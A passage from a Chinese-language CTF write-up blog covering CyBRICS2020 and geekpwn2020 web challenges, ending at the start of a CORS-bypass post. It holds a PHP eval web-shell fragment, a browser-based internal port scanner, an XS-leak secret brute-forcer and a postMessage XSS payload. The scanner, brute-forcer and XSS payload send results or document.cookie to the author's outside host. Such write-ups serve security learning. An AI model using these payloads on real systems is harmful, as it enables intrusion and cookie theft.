<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*/)).eval($_POST[1])?&gt;</span><br><span class="line">$requiredBlocks = [</span><br><span class="line">            &#x27;id=&quot;back&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;field&quot; name=&quot;field&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit0&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit1&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit2&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit3&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit4&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit5&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit6&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit7&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit8&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;digit9&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;plus&quot;&#x27;,</span><br><span class="line">            &#x27;id=&quot;equals&quot;&#x27;,</span><br><span class="line">        ];</span><br></pre></td></tr></table></figure>

<p>向calc post:<br><code>field=1/*&amp;share=1</code></p>
<p>flag:cybrics{5aMe_7h1ng_W3_d0_3Ve5y_n16ht_P1nKY.Try_2_t4k3_0vEr_t3h_w0RLd}</p>
<h2 id="Developer’s-Laptop"><a href="#Developer’s-Laptop" class="headerlink" title="Developer’s Laptop"></a>Developer’s Laptop</h2><p>看题目样子是xss题?SSRF?</p>
<p>浏览器信息：HeadlessChrome/79.0.3945.79 </p>
<p>填写脚本：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;form-control&quot;</span>);a[<span class="number">1</span>].value=<span class="string">&quot;WQLSaidXUtQAfD6ptJc7Yg&quot;</span>;a[<span class="number">0</span>].value=<span class="string">&quot;http://ccreater.top:60000&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>返回包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HEAD / HTTP/1.1</span><br><span class="line">Host: ccreater.top:60000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.79 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Origin: prod.free-design-feedback-cybrics2020.ctf.su</span><br><span class="line">Referer: http://prod.free-design-feedback-cybrics2020.ctf.su</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>等等开发人员的电脑？肯定一堆服务，内网扫描！</p>
<p>http服务扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    </span><br><span class="line">&lt;script&gt;</span><br><span class="line">var from = 1;</span><br><span class="line">var complete = true;</span><br><span class="line">var clear = false;</span><br><span class="line">function check(text)&#123;</span><br><span class="line">    var linkEl = document.head.querySelector(&#x27;link[href*=&quot;&#x27;+text+&#x27;&quot;&#x27;);</span><br><span class="line">    var cssLoaded = Boolean(linkEl.sheet);</span><br><span class="line">    linkEl.addEventListener(&#x27;load&#x27;, function () &#123;</span><br><span class="line">        console.log(text)</span><br><span class="line">        // log</span><br><span class="line">		fetch(&quot;http://ccreater.top:60010/log.php?log=&quot;+text)</span><br><span class="line">			.then(r=&gt;r.text())</span><br><span class="line">			.then(d=&gt;&#123;console.log(&quot;log success&quot;)&#125;)</span><br><span class="line">		// log end</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">function clearstyle(clear_from ,clear_to)&#123;</span><br><span class="line">	clear = true;</span><br><span class="line">	console.log(&quot;clear task start&quot;);</span><br><span class="line">	while(clear_to&lt;=clear_from)&#123;</span><br><span class="line">            document.head.querySelector(&#x27;link[href$=&quot;:&#x27;+clear_to+&#x27;&quot;&#x27;).remove();</span><br><span class="line">			clear_to++;</span><br><span class="line">    &#125;</span><br><span class="line">	clear = false;</span><br><span class="line">	console.log(&quot;clear task end&quot;);</span><br><span class="line">&#125;</span><br><span class="line">function make(text)&#123;</span><br><span class="line">    head = document.getElementsByTagName(&#x27;head&#x27;)[0];</span><br><span class="line">	var port = text;</span><br><span class="line">    var url = &quot;http://127.0.0.1:&quot;+port,</span><br><span class="line">    link = document.createElement(&#x27;link&#x27;);</span><br><span class="line">    link.rel = &quot;stylesheet&quot;;</span><br><span class="line">    link.href = url;</span><br><span class="line">    head.appendChild(link);</span><br><span class="line">    check(text);</span><br><span class="line">&#125;</span><br><span class="line">async function scan()&#123;</span><br><span class="line">	var to = from + 80 &gt; 65535 ? 65535 : from + 80;</span><br><span class="line">	for(var i=from;i&lt;to;i++)&#123;</span><br><span class="line">		make(String(i));</span><br><span class="line">	&#125;</span><br><span class="line">	from +=80;</span><br><span class="line">	setTimeout(()=&gt;&#123;clearstyle(from,to);&#125;,5000);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">async function listener ()&#123;</span><br><span class="line">	console.log(&quot;listener works,from:&quot;+from+&quot;,complete:&quot;+complete);</span><br><span class="line">	if(from &lt; 65535)&#123;</span><br><span class="line">		setTimeout(listener,5000);</span><br><span class="line">		if(complete &amp;&amp; !clear)&#123;</span><br><span class="line">			console.log(&quot;new task!&quot;);</span><br><span class="line">			scan()</span><br><span class="line">				.then(()=&gt;&#123;complete = true;&#125;)</span><br><span class="line">			complete = false;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">listener()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>虽然我猜到了有内网服务但是到最后我还是没有扫到。。</p>
<p>脚本在本地是可以跑的，但是服务器上就不行，可能是因为有时间限制吧，遗憾。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/07/28/CyBRICS2020/" data-id="cku8ky2x2001ednnf9u8hfgnu" data-title="CyBRICS2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-geekpwn2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/18/geekpwn2020/" class="article-date">
  <time class="dt-published" datetime="2020-07-18T16:00:00.000Z" itemprop="datePublished">2020-07-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/18/geekpwn2020/">geekpwn2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="geekpwn-2020热身赛"><a href="#geekpwn-2020热身赛" class="headerlink" title="geekpwn 2020热身赛"></a>geekpwn 2020热身赛</h1><h2 id="cosplay"><a href="#cosplay" class="headerlink" title="cosplay"></a>cosplay</h2><p>直接用cos的api读取文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cos.getBucket(&#123;</span><br><span class="line">    <span class="attr">Bucket</span>: Bucket,</span><br><span class="line">    <span class="attr">Region</span>: Region,</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err || data.Contents);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cos.getObject(&#123;</span><br><span class="line">    <span class="attr">Bucket</span>: Bucket,</span><br><span class="line">    <span class="attr">Region</span>: Region,</span><br><span class="line">    <span class="attr">Key</span>: <span class="string">&#x27;f1L9@/flag.txt&#x27;</span>,</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err || data.Body);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="noXss2020"><a href="#noXss2020" class="headerlink" title="noXss2020"></a>noXss2020</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, Response</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">DATASET = &#123;</span><br><span class="line">    <span class="number">114</span>: <span class="string">&#x27;514&#x27;</span>,</span><br><span class="line">    <span class="number">810</span>: <span class="string">&#x27;8931919&#x27;</span>,</span><br><span class="line">    <span class="number">2017</span>: <span class="string">&#x27;https://blog.cal1.cn/post/RCTF%202017%20rCDN%20%26%20noxss%20writeup&#x27;</span>,</span><br><span class="line">    <span class="number">2019</span>: <span class="string">&#x27;https://hackmd.io/IlzCicHXSN-MXl2JLCYr0g?view&#x27;</span>,</span><br><span class="line">    <span class="number">2020</span>: <span class="string">&#x27;flag&#123;2333333333&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_host</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_handler</span>():</span></span><br><span class="line">    keyword = request.args.get(<span class="string">&#x27;keyword&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> keyword <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(DATASET)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> DATASET:</span><br><span class="line">            <span class="keyword">if</span> keyword <span class="keyword">in</span> DATASET[i]:</span><br><span class="line">                ret[i] = DATASET[i]</span><br><span class="line">        <span class="keyword">return</span> jsonify(ret), <span class="number">200</span> <span class="keyword">if</span> <span class="built_in">len</span>(ret) <span class="keyword">else</span> <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_security_headers</span>(<span class="params">resp</span>):</span></span><br><span class="line">    resp.headers[<span class="string">&#x27;X-Frame-Options&#x27;</span>] = <span class="string">&#x27;sameorigin&#x27;</span></span><br><span class="line">    resp.headers[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="string">&#x27;default-src \&#x27;self\&#x27;; frame-src https://www.youtube.com&#x27;</span></span><br><span class="line">    resp.headers[<span class="string">&#x27;X-Content-Type-Options&#x27;</span>] = <span class="string">&#x27;nosniff&#x27;</span></span><br><span class="line">    resp.headers[<span class="string">&#x27;Referrer-Policy&#x27;</span>] = <span class="string">&#x27;same-origin&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">3000</span>, )</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>我们注意到search是通过in来判断是否存在，并返回404或200</p>
<p>虽然<code>http://noxss2020.cal1.cn:3000/</code>有cors,但是我们并不需要他返回的内容，我们只需要状态码，这样就简单多了。我们将页面当成css来加载，通过是否加载成功来判断状态码</p>
<p>payload:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> guess=<span class="string">&quot;flag&quot;</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ok=<span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">text</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> linkEl = <span class="built_in">document</span>.head.querySelector(<span class="string">&#x27;link[href*=&quot;&#x27;</span>+text+<span class="string">&#x27;&quot;&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> cssLoaded = <span class="built_in">Boolean</span>(linkEl.sheet);</span></span><br><span class="line"><span class="javascript">    linkEl.addEventListener(<span class="string">&#x27;load&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        </span></span><br><span class="line"><span class="javascript">        guess=<span class="built_in">unescape</span>(text);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(guess)</span></span><br><span class="line"><span class="javascript">        ok=<span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(guess.endsWith(<span class="string">&quot;&#125;&quot;</span>))&#123;</span></span><br><span class="line"><span class="javascript">            location=<span class="string">&quot;http://ccreater.top:60010/log.php?log=&quot;</span>+guess;</span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> s = guess.substr(<span class="number">0</span>,guess.length-<span class="number">1</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span>(tmp=<span class="built_in">document</span>.head.querySelector(<span class="string">&#x27;link[href*=&quot;&#x27;</span>+s+<span class="string">&#x27;&quot;&#x27;</span>))&#123;</span></span><br><span class="line"><span class="javascript">            tmp.remove();</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        fuzz()</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params">text</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;head&#x27;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> url = <span class="string">&quot;http://127.0.0.1:3000/search?keyword=&quot;</span>+<span class="built_in">escape</span>(text),</span></span><br><span class="line"><span class="javascript">    link = <span class="built_in">document</span>.createElement(<span class="string">&#x27;link&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    link.rel = <span class="string">&quot;stylesheet&quot;</span>;</span></span><br><span class="line"><span class="javascript">    link.href = url;</span></span><br><span class="line"><span class="javascript">    head.appendChild(link);</span></span><br><span class="line"><span class="javascript">    check(<span class="built_in">escape</span>(text));</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">fuzz</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(i <span class="keyword">of</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&quot;</span>)&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(make(guess+i))&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">true</span></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    fuzz()</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">fuzz()</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="umsg"><a href="#umsg" class="headerlink" title="umsg"></a>umsg</h2><p>阅读代码发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function(e, t, r) &#123;</span><br><span class="line">        &quot;use strict&quot;;</span><br><span class="line">        r.r(t);</span><br><span class="line">        r(91);</span><br><span class="line">        var n = &#123;</span><br><span class="line">            mounted: function() &#123;</span><br><span class="line">                window.addEventListener(&quot;message&quot;, (function(e) &#123;</span><br><span class="line">                    if (e.origin.match(&quot;http://umsg.iffi.top&quot;))</span><br><span class="line">                        switch (e.data.action) &#123;</span><br><span class="line">                        case &quot;append&quot;:</span><br><span class="line">                            return void (document.getElementsByTagName(&quot;main&quot;)[0].innerHTML += e.data.payload);</span><br><span class="line">                        case &quot;debug&quot;:</span><br><span class="line">                            return void console.log(e.data.payload);</span><br><span class="line">                        case &quot;ping&quot;:</span><br><span class="line">                            return void e.source.postMessage(&quot;pong&quot;, &quot;*&quot;)</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ), !1),</span><br><span class="line">                postMessage(&#123;</span><br><span class="line">                    action: &quot;ping&quot;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>那么我们可以在页面中嵌入iframe来postMessage,从而插入恶意内容，唯一的障碍是：<code>e.origin.match(&quot;http://umsg.iffi.top&quot;)</code></p>
<p>因为match是一个正则匹配函数，所以构造<code>http://umsg_iffi_top.evildomain</code>来绕过</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    </span><br><span class="line">&lt;iframe src=&quot;http://umsg.iffi.top:3000/&quot; height=&quot;100%&quot; width=&quot;100%&quot; frameborder=&quot;0&quot; scrolling=&quot;auto&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">setTimeout(()=&gt;&#123;</span><br><span class="line">document.body.children[0].contentWindow.postMessage(&#123;action:&quot;append&quot;,payload:&quot;&lt;img src=1 onerror=&#x27;location=(`http://ccreater.top:60010/log.php?log=`+document.cookie)&#x27;&gt;&quot;&#125;,&quot;http://umsg.iffi.top:3000/&quot;)</span><br><span class="line">&#125;,5000);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/07/18/geekpwn2020/" data-id="cku8ky2yf004ednnfg7rt4i5b" data-title="geekpwn2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-bypass CORS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/08/bypass%20CORS/" class="article-date">
  <time class="dt-published" datetime="2020-07-08T16:00:00.000Z" itemprop="datePublished">2020-07-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/08/bypass%20CORS/">bypass CORS</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-CORS"><a href="#bypass-CORS" class="headerlink" title="bypass CORS"></a>bypass CORS</h1><h2 id="什么是CORS"><a href="#什么是CORS" class="headerlink" title="什么是CORS"></a>什么是CORS</h2><p>CORS: Cross Origin Resource Share,设置在服务端，客户端执行的一种策略。</p>
<blockquote>
<p>出于安全原因，浏览器限制从脚本内发起的跨源HTTP请求或者 跨站请求可以正常发起，但是返回结果被浏览器拦截了 。 例如，XMLHttpRequest和Fetch API遵循同源策略。 这意味着使用这些API的Web应用程序只能从加载应用程序的同一个域请求HTTP资源，除非响应报文包含了正确CORS响应头。 </p>
</blockquote>
<h2 id="相关的字段"><a href="#相关的字段" class="headerlink" title="相关的字段"></a>相关的字段</h2><p>响应：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin</span><br><span class="line">Access-Control-Expose-Headers</span><br><span class="line">Access-Control-Max-Age</span><br><span class="line">Access-Control-Allow-Credentials</span><br><span class="line">Access-Control-Allow-Methods</span><br><span class="line">Access-Control-Allow-Headers</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Origin</span><br><span class="line">Access-Control-Request-Method</span><br><span class="line">Access-Control-Request-Headers</span><br><span class="line"></span><br></pre></td></tr></table></figure>



